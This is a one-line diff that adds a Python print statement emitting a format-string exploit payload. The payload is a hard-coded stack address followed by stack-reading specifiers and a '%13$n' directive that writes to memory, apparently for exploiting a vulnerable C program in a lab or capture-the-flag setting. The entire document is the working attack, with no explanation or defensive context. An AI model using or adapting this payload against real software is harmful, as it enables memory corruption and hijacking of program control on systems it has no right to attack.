@@ -1,0 +1,1 @@
+print("\x38\xd5\xff\xff%08x%08x%012d%13$n")
